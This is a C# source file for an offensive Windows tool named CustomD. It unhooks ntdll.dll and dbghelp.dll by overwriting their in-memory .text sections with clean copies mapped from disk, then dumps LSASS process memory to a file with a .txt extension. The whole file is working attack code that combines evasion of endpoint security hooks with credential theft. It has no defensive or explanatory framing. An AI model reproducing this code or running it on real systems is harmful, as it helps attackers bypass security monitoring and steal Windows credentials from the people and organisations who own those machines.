using System;
using System.IO;
using static CustomD.DumpProc;
using static CustomD.Win32;
using static CustomD.LocalProc;
using static CustomD.FromDisk;
using static CustomD.HelperFunctions;


namespace CustomD
{
    public class Program
    {
        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
        public static int bufferSize = 0;

        // Overwrite hooked ntdll .text section with a clean version
        static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
            uint dwOldProtection;
            bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            if (!vp1_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)");
                Environment.Exit(0);
            }

            // Copy from one address to the other
            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }

            // VirtualProtect back to PAGE_EXECUTE_READ
            bool vp2_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, dwOldProtection, out dwOldProtection);
            if (!vp2_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (dwOldProtection)");
                Environment.Exit(0);
            }
        }


        public static void Main(string[] args)
        {
            // NTDLL
            // Clean DLL
            Console.WriteLine("[+] Patching NTDLL.DLL");
            IntPtr unhookedNtdllTxt = IntPtr.Zero;
            string ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
            IntPtr unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
            Console.WriteLine("\t[+] Mapped Ntdll Handle [Disk]: \t\t0x" + unhookedNtdllHandle.ToString("X"));
            unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
            Console.WriteLine("\t[+] Mapped Ntdll .Text Section [Disk]: \t\t0x" + unhookedNtdllTxt.ToString("X"));
            // Local DLL
            IntPtr localNtdllHandle = CustomGetModuleHandle("ntdll.dll");
            Console.WriteLine("\t[+] Local Ntdll Handle: \t\t\t0x" + localNtdllHandle.ToString("X"));
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;
            Console.WriteLine("\t[+] Local Ntdll Text Section: \t\t\t0x" + localNtdllTxt.ToString("X"));
            // Replace DLL
            Console.WriteLine("\t[+] Copying " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);

            // DBGHELP
            // Clean DLL
            Console.WriteLine("[+] Patching DBGHELP.DLL");
            IntPtr unhookedDbghelpTxt = IntPtr.Zero;
            string dbghelp_path = "C:\\Windows\\System32\\dbghelp.dll";
            IntPtr unhookedDbghelpHandle = MapNtdllFromDisk(dbghelp_path);
            Console.WriteLine("\t[+] Mapped Dbghelp Handle [Disk]: \t\t0x" + unhookedDbghelpHandle.ToString("X"));
            unhookedDbghelpTxt = unhookedDbghelpHandle + offset_mappeddll;
            Console.WriteLine("\t[+] Mapped Dbghelp .Text Section [Disk]: \t0x" + unhookedDbghelpTxt.ToString("X"));
            // Local DLL
            LoadLibrary("dbghelp.dll");
            IntPtr localDbghelpHandle = CustomGetModuleHandle("dbghelp.dll");
            Console.WriteLine("\t[+] Local Dbghelp Handle: \t\t\t0x" + localDbghelpHandle.ToString("X"));
            int[] result2 = GetTextSectionInfo(localDbghelpHandle);
            int localDbghelpTxtBase = result2[0];
            int localDbghelpTxtSize = result2[1];
            IntPtr localDbghelpTxt = localDbghelpHandle + localDbghelpTxtBase;
            Console.WriteLine("\t[+] Local Dbghelp Text Section: \t\t0x" + localDbghelpTxt.ToString("X"));
            // Replace DLL
            Console.WriteLine("\t[+] Copying " + localDbghelpTxtSize + " bytes from 0x" + unhookedDbghelpTxt.ToString("X") + " to 0x" + localDbghelpTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedDbghelpTxt, localDbghelpTxt, localDbghelpTxtSize);


            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }
            DumpLsass(filename);
        }
    }

}